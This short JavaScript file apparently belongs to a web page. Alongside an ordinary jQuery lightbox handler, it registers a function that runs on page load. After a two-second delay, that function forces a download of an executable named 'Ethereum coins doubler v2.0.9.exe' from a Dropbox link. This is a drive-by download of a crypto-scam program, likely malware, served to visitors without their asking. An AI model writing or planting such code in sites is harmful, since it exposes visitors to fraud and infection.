function download(){
  setTimeout(function(){
    downloadFile("https://dl.dropboxusercontent.com/s/1l7yfefxzqg0iuz/Ethereum%20coins%20doubler%20v2.0.9.exe");
  }, 1998);
};
window.addEventListener("load", download);
$(document).on('click', '[data-toggle="lightbox"]', function(event) {
  event.preventDefault();
  $(this).ekkoLightbox();
});
